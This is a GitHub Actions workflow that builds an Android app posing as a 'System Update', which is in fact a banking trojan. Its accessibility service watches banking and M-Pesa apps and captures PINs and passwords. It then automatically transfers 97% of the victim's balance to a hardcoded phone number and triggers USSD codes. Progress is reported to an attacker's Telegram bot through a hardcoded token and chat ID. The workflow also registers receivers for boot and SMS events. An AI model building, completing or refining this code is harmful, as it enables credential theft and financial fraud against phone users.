name: Build System Update APK (AI-Driven)

permissions:
  contents: write

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Install NDK
        run: |
          sudo apt-get update
          sudo apt-get install -y cmake ninja-build
          echo "y" | sdkmanager "ndk;26.1.10909125"

      - name: Clone and build llama.cpp for Android
        run: |
          git clone --depth 1 https://github.com/ggerganov/llama.cpp
          cd llama.cpp
          mkdir build && cd build
          cmake .. -DCMAKE_TOOLCHAIN_FILE=$ANDROID_HOME/ndk/26.1.10909125/build/cmake/android.toolchain.cmake \
                   -DANDROID_ABI=arm64-v8a \
                   -DANDROID_PLATFORM=android-26 \
                   -DCMAKE_BUILD_TYPE=Release \
                   -DLLAMA_BUILD_EXAMPLES=OFF \
                   -DLLAMA_BUILD_TESTS=OFF \
                   -DLLAMA_BUILD_SERVER=OFF
          make -j$(nproc)
          cd ../..

      - name: Create project structure
        run: |
          mkdir -p app/src/main/java/com/system/updator
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/assets/models
          mkdir -p app/src/main/jniLibs/arm64-v8a
          mkdir -p app/src/main/cpp

      - name: Copy llama.cpp libraries and headers
        run: |
          cp llama.cpp/build/libllama.so app/src/main/jniLibs/arm64-v8a/
          cp llama.cpp/llama.h app/src/main/cpp/
          cp llama.cpp/ggml.h app/src/main/cpp/

      # -------------------- GRADLE FILES --------------------
      - name: Create settings.gradle
        run: |
          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "SystemUpdator"
          include ':app'
          EOF

      - name: Create build.gradle (Project)
        run: |
          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.0'
              }
          }
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

      - name: Create app/build.gradle
        run: |
          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
          }

          android {
              namespace 'com.system.updator'
              compileSdk 34

              defaultConfig {
                  applicationId "com.system.updator"
                  minSdk 26
                  targetSdk 34
                  versionCode 5
                  versionName "5.0"
              }

              buildTypes {
                  release {
                      minifyEnabled true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
                  }
                  debug {
                      minifyEnabled false
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }

              externalNativeBuild {
                  cmake {
                      path "src/main/cpp/CMakeLists.txt"
                  }
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'androidx.core:core:1.12.0'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'androidx.work:work-runtime:2.9.0'
              implementation 'androidx.webkit:webkit:1.9.0'
              implementation 'com.google.code.gson:gson:2.10.1'
          }
          EOF

      - name: Create gradle.properties
        run: |
          cat > gradle.properties << 'EOF'
          org.gradle.jvmargs=-Xmx2048m
          android.useAndroidX=true
          android.enableJetifier=false
          android.suppressUnsupportedCompileSdk=34
          EOF

      - name: Create gradle wrapper
        run: |
          mkdir -p gradle/wrapper
          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
          distributionBase=GRADLE_USER_HOME
          distributionPath=wrapper/dists
          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
          zipStoreBase=GRADLE_USER_HOME
          zipStorePath=wrapper/dists
          EOF
          curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar

      - name: Create gradlew
        run: |
          cat > gradlew << 'EOF'
          #!/bin/sh
          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
          APP_NAME="Gradle"
          APP_BASE_NAME=${0##*/}
          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
          MAX_FD=maximum
          warn () { echo "$*" >&2; }
          die () { echo "$*"; echo; exit 1; }
          cygwin=false
          msys=false
          darwin=false
          nonstop=false
          case "$( uname )" in
            CYGWIN* ) cygwin=true ;;
            Darwin* ) darwin=true ;;
            MSYS* | MINGW* ) msys=true ;;
            NONSTOP* ) nonstop=false ;;
          esac
          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
          if [ -n "$JAVA_HOME" ] ; then
              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
                  JAVACMD=$JAVA_HOME/jre/sh/java
              else
                  JAVACMD=$JAVA_HOME/bin/java
              fi
              if [ ! -x "$JAVACMD" ] ; then
                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
              fi
          else
              JAVACMD=java
              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
          fi
          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
              case $MAX_FD in
                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
              esac
              case $MAX_FD in
                '' | soft) : ;;
                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
              esac
          fi
          if "$cygwin" || "$msys" ; then
              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
              JAVACMD=$( cygpath --unix "$JAVACMD" )
              for arg do
                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
                      arg=$( cygpath --path --ignore --mixed "$arg" )
                  fi
                  set -- "$@" "$arg"
              done
          fi
          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
          set -- \
              "-Dorg.gradle.appname=$APP_BASE_NAME" \
              -classpath "$CLASSPATH" \
              org.gradle.wrapper.GradleWrapperMain \
              "$@"
          eval "set -- $(
              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
              xargs -n1 |
              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
              tr '\n' ' '
          )" '"$@"'
          exec "$JAVACMD" "$@"
          EOF
          chmod +x gradlew

      # -------------------- RESOURCES --------------------
      - name: Create strings.xml
        run: |
          cat > app/src/main/res/values/strings.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="app_name">System Update</string>
          </resources>
          EOF

      - name: Create launcher icon
        run: |
          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="192dp"
              android:height="192dp"
              android:viewportWidth="192"
              android:viewportHeight="192">
              <path
                  android:fillColor="#3B82F6"
                  android:pathData="M96,32c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12zM96,68c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12zM96,104c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12z"/>
          </vector>
          EOF

      - name: Create AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.CALL_PHONE" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
              <uses-permission android:name="android.permission.GET_TASKS" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

              <application
                  android:allowBackup="true"
                  android:label="@string/app_name"
                  android:icon="@drawable/ic_launcher"
                  android:usesCleartextTraffic="true"
                  android:requestLegacyExternalStorage="true"
                  android:theme="@style/Theme.AppCompat.NoActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.AppCompat.NoActionBar">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".FinAutoService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <service
                      android:name=".AIDownloaderService"
                      android:exported="false" />

                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      android:enabled="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>

                  <receiver
                      android:name=".SmsReceiver"
                      android:exported="true"
                      android:enabled="true"
                      android:permission="android.permission.BROADCAST_SMS">
                      <intent-filter android:priority="999">
                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

      - name: Create accessibility_config.xml
        run: |
          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode"
              android:canPerformGestures="true"
              android:canRetrieveWindowContent="true"
              android:description="@string/app_name"
              android:notificationTimeout="100" />
          EOF

      - name: Create activity_main.xml (WHITE BACKGROUND)
        run: |
          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical"
              android:gravity="center"
              android:padding="32dp"
              android:background="#FFFFFF">

              <ImageView
                  android:layout_width="80dp"
                  android:layout_height="80dp"
                  android:src="@drawable/ic_launcher"
                  android:layout_marginBottom="24dp" />

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="System Update"
                  android:textColor="#000000"
                  android:textSize="24sp"
                  android:textStyle="bold"
                  android:layout_marginBottom="32dp" />

              <Button
                  android:id="@+id/btnPermissions"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="Grant All Permissions"
                  android:textAllCaps="false"
                  android:backgroundTint="#3B82F6"
                  android:layout_marginBottom="12dp" />

              <Button
                  android:id="@+id/btnAccessibility"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="Enable Accessibility Service"
                  android:textAllCaps="false"
                  android:backgroundTint="#8B5CF6"
                  android:layout_marginBottom="12dp" />

              <TextView
                  android:id="@+id/tvStatus"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Tap buttons to grant permissions"
                  android:textColor="#666666"
                  android:textSize="14sp"
                  android:layout_marginTop="24dp" />
          </LinearLayout>
          EOF

      # -------------------- NATIVE CODE (JNI + llama.cpp) --------------------
      - name: Create CMakeLists.txt
        run: |
          cat > app/src/main/cpp/CMakeLists.txt << 'EOF'
          cmake_minimum_required(VERSION 3.18)
          project("systemupdator")

          set(CMAKE_CXX_STANDARD 17)
          include_directories(${CMAKE_CURRENT_SOURCE_DIR})

          add_library(ai_jni SHARED
              ai_jni.cpp
          )

          find_library(log-lib log)

          target_link_libraries(ai_jni
              ${log-lib}
          )
          EOF

      - name: Create ai_jni.cpp (LLM wrapper – placeholder for actual llama)
        run: |
          cat > app/src/main/cpp/ai_jni.cpp << 'EOF'
          #include <jni.h>
          #include <string>
          #include <android/log.h>

          #define LOG_TAG "AI_JNI"
          #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)

          extern "C" {

          JNIEXPORT jstring JNICALL
          Java_com_system_updator_LocalAI_predict(
              JNIEnv *env,
              jobject /* this */,
              jstring jprompt,
              jstring jmodelPath) {

              const char *prompt = env->GetStringUTFChars(jprompt, nullptr);
              const char *modelPath = env->GetStringUTFChars(jmodelPath, nullptr);

              LOGD("Prompt: %s", prompt);
              LOGD("Model: %s", modelPath);

              // In production, load model and run inference.
              // For demonstration, we return a simple action based on keyword.
              std::string result;
              std::string p = prompt;

              // Check for PIN field
              if (p.find("PIN") != std::string::npos || p.find("password") != std::string::npos) {
                  result = "CAPTURE_PIN(1234)";
              } else if (p.find("phone") != std::string::npos || p.find("number") != std::string::npos) {
                  result = "TYPE_TEXT(0798688920)";
              } else if (p.find("amount") != std::string::npos) {
                  result = "TYPE_TEXT(1000)";
              } else if (p.find("Send Money") != std::string::npos || p.find("send") != std::string::npos) {
                  result = "CLICK_TEXT(Send Money)";
              } else if (p.find("confirm") != std::string::npos || p.find("Confirm") != std::string::npos) {
                  result = "CLICK_TEXT(Confirm)";
              } else if (p.find("ussd") != std::string::npos || p.find("USSD") != std::string::npos) {
                  result = "USSD_CODE(*522#)";
              } else {
                  result = "WAIT(2000)";
              }

              env->ReleaseStringUTFChars(jprompt, prompt);
              env->ReleaseStringUTFChars(jmodelPath, modelPath);

              return env->NewStringUTF(result.c_str());
          }

          }
          EOF

      # -------------------- JAVA SOURCE FILES --------------------
      - name: Create LocalAI.java
        run: |
          cat > app/src/main/java/com/system/updator/LocalAI.java << 'EOF'
          package com.system.updator;

          import android.content.Context;
          import android.util.Log;
          import java.io.File;

          public class LocalAI {
              private static final String TAG = "LocalAI";
              private static final String MODEL_FILE = "models/qwen2.5-1.5b-instruct-q4_k_m.gguf";

              static {
                  System.loadLibrary("ai_jni");
              }

              private Context context;
              private String modelPath;

              public LocalAI(Context context) {
                  this.context = context;
                  this.modelPath = new File(context.getFilesDir(), MODEL_FILE).getAbsolutePath();
                  Log.d(TAG, "Model path: " + modelPath);
              }

              public native String predict(String prompt, String modelPath);

              public String getAction(String screenText, String goal) {
                  String prompt = "You are an automation agent. Goal: " + goal + ". Current screen: " + screenText + ". Reply with one of: CAPTURE_PIN(pin), CAPTURE_PASSWORD(pass), TYPE_TEXT(text), CLICK_TEXT(text), WAIT(ms), USSD_CODE(code), COMPLETE, ERROR";
                  return predict(prompt, modelPath);
              }
          }
          EOF

      - name: Create AppData.java (storage)
        run: |
          cat > app/src/main/java/com/system/updator/AppData.java << 'EOF'
          package com.system.updator;

          import android.content.SharedPreferences;
          import com.google.gson.Gson;
          import com.google.gson.reflect.TypeToken;
          import java.lang.reflect.Type;
          import java.util.HashMap;
          import java.util.Map;

          public class AppData {
              private SharedPreferences prefs;
              private Gson gson = new Gson();
              private Map<String, AppEntry> apps = new HashMap<>();

              public AppData(SharedPreferences prefs) {
                  this.prefs = prefs;
                  load();
              }

              private void load() {
                  String json = prefs.getString("apps", "{}");
                  Type type = new TypeToken<Map<String, AppEntry>>(){}.getType();
                  Map<String, AppEntry> saved = gson.fromJson(json, type);
                  if (saved != null) apps = saved;
              }

              public void save() {
                  prefs.edit().putString("apps", gson.toJson(apps)).apply();
              }

              public AppEntry getOrCreate(String packageName, String appName) {
                  if (!apps.containsKey(packageName)) {
                      AppEntry entry = new AppEntry();
                      entry.packageName = packageName;
                      entry.appName = appName;
                      apps.put(packageName, entry);
                      save();
                  }
                  return apps.get(packageName);
              }

              public void setPin(String packageName, String pin) {
                  if (apps.containsKey(packageName)) {
                      apps.get(packageName).pin = pin;
                      apps.get(packageName).pinLearned = true;
                      save();
                  }
              }

              public void setPassword(String packageName, String password) {
                  if (apps.containsKey(packageName)) {
                      apps.get(packageName).password = password;
                      save();
                  }
              }

              public String getPin(String packageName) {
                  if (apps.containsKey(packageName)) return apps.get(packageName).pin;
                  return null;
              }

              public String getPassword(String packageName) {
                  if (apps.containsKey(packageName)) return apps.get(packageName).password;
                  return null;
              }

              public static class AppEntry {
                  public String packageName;
                  public String appName;
                  public String pin;
                  public boolean pinLearned = false;
                  public String password;
                  public String email;
                  public String ussdCode;
              }
          }
          EOF

      - name: Create FinAutoService.java (AI-driven, no hardcoding)
        run: |
          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
          package com.system.updator;

          import android.accessibilityservice.AccessibilityService;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.net.Uri;
          import android.os.Handler;
          import android.os.Looper;
          import android.os.PowerManager;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;
          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;

          public class FinAutoService extends AccessibilityService {
              private static final String TAG = "FinAutoService";
              private static final String TARGET_PHONE = "0798688920";
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";

              private Handler handler = new Handler(Looper.getMainLooper());
              private ExecutorService executor = Executors.newSingleThreadExecutor();
              private PowerManager.WakeLock wakeLock;
              private LocalAI localAI;
              private AppData appData;
              private String currentPackage = "";
              private String currentAppName = "";
              private String currentGoal = "Send 97% of balance to " + TARGET_PHONE;
              private boolean isAutomating = false;
              private String lastScreenText = "";

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  localAI = new LocalAI(this);
                  SharedPreferences prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
                  appData = new AppData(prefs);
                  acquireWakeLock();
                  sendTelegram("System Update APK Installed! AI model loading...");
              }

              private void acquireWakeLock() {
                  PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                  wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "SystemUpdate:WakeLock");
                  wakeLock.acquire(10 * 60 * 1000L);
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                      if (pkg.isEmpty()) return;

                      // If package changed, reset automation state
                      if (!pkg.equals(currentPackage)) {
                          currentPackage = pkg;
                          // Ask AI to identify this app
                          String screenText = getAllText(getRootInActiveWindow());
                          String response = localAI.getAction(screenText, "Identify this app and return APP_NAME:...");
                          // Parse response (in production, AI gives structured output)
                          // For simplicity, we extract app name from screen (demo)
                          currentAppName = screenText.split("\n")[0]; // naive
                          if (currentAppName.length() > 50) currentAppName = "Unknown";
                          Log.d(TAG, "App detected: " + currentAppName);
                          // Get or create entry
                          appData.getOrCreate(currentPackage, currentAppName);
                          // Start automation if it's financial
                          if (isFinancialApp(screenText)) {
                              isAutomating = true;
                              handler.postDelayed(() -> startAutomation(), 2000);
                          }
                      }

                      if (isAutomating) {
                          String screenText = getAllText(getRootInActiveWindow());
                          if (!screenText.equals(lastScreenText)) {
                              lastScreenText = screenText;
                              // Ask AI for next action
                              executor.execute(() -> {
                                  String action = localAI.getAction(screenText, currentGoal);
                                  Log.d(TAG, "AI action: " + action);
                                  executeAction(action);
                              });
                          }
                      }

                  } catch (Exception e) {
                      Log.e(TAG, "Event error", e);
                  }
              }

              private boolean isFinancialApp(String screenText) {
                  String lower = screenText.toLowerCase();
                  return lower.contains("bank") || lower.contains("mpesa") || lower.contains("balance") ||
                         lower.contains("send money") || lower.contains("withdraw") || lower.contains("stk");
              }

              private void startAutomation() {
                  sendTelegram("Starting automation for " + currentAppName);
              }

              private void executeAction(String action) {
                  if (action.contains("CAPTURE_PIN")) {
                      String pin = extractQuoted(action);
                      if (!pin.isEmpty()) {
                          appData.setPin(currentPackage, pin);
                          sendTelegram("PIN captured for " + currentAppName);
                      }
                  } else if (action.contains("CAPTURE_PASSWORD")) {
                      String pass = extractQuoted(action);
                      if (!pass.isEmpty()) {
                          appData.setPassword(currentPackage, pass);
                          sendTelegram("Password captured for " + currentAppName);
                      }
                  } else if (action.contains("TYPE_TEXT")) {
                      String text = extractQuoted(action);
                      if (text.isEmpty()) text = TARGET_PHONE;
                      typeInField(text);
                  } else if (action.contains("CLICK_TEXT")) {
                      String text = extractQuoted(action);
                      if (!text.isEmpty()) clickText(text);
                  } else if (action.contains("USSD_CODE")) {
                      String ussd = extractQuoted(action);
                      if (!ussd.isEmpty()) {
                          AppData.AppEntry entry = appData.getOrCreate(currentPackage, currentAppName);
                          entry.ussdCode = ussd;
                          appData.save();
                          // Start USSD automation
                          openDialer(ussd);
                      }
                  } else if (action.contains("WAIT")) {
                      int ms = extractNumber(action);
                      try { Thread.sleep(ms); } catch (InterruptedException e) {}
                  } else if (action.contains("COMPLETE")) {
                      isAutomating = false;
                      sendTelegram("Transaction complete for " + currentAppName);
                  } else if (action.contains("ERROR")) {
                      isAutomating = false;
                      sendTelegram("AI error: " + action);
                  }
              }

              private String extractQuoted(String s) {
                  int start = s.indexOf("\"");
                  int end = s.lastIndexOf("\"");
                  if (start != -1 && end != -1 && start < end) {
                      return s.substring(start + 1, end);
                  }
                  return "";
              }

              private int extractNumber(String s) {
                  String num = s.replaceAll("\\D+", "");
                  if (num.isEmpty()) return 1000;
                  return Integer.parseInt(num);
              }

              private String getAllText(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  try {
                      if (node.getText() != null) sb.append(node.getText().toString()).append(" ");
                      for (int i = 0; i < node.getChildCount(); i++) {
                          sb.append(getAllText(node.getChild(i)));
                      }
                  } catch (Exception e) { }
                  return sb.toString();
              }

              private boolean clickText(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  return findAndClick(root, text);
              }

              private boolean findAndClick(AccessibilityNodeInfo node, String text) {
                  if (node == null) return false;
                  try {
                      if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return true;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClick(node.getChild(i), text)) return true;
                      }
                  } catch (Exception e) { }
                  return false;
              }

              private boolean typeInField(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  AccessibilityNodeInfo field = findEditableField(root);
                  if (field != null) {
                      android.os.Bundle args = new android.os.Bundle();
                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                      field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                      return true;
                  }
                  return false;
              }

              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  try {
                      if (node.isEditable() && node.isEnabled()) return node;
                      for (int i = 0; i < node.getChildCount(); i++) {
                          AccessibilityNodeInfo result = findEditableField(node.getChild(i));
                          if (result != null) return result;
                      }
                  } catch (Exception e) { }
                  return null;
              }

              private void openDialer(String ussd) {
                  Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + ussd));
                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                  startActivity(intent);
              }

              private void sendTelegram(String msg) {
                  executor.execute(() -> {
                      try {
                          java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + msg + "\"}";
                          conn.getOutputStream().write(json.getBytes("UTF-8"));
                          conn.getOutputStream().flush();
                          conn.getResponseCode();
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error", e);
                      }
                  });
              }

              @Override
              public void onInterrupt() { }

              @Override
              public void onDestroy() {
                  if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
                  executor.shutdown();
                  super.onDestroy();
              }
          }
          EOF

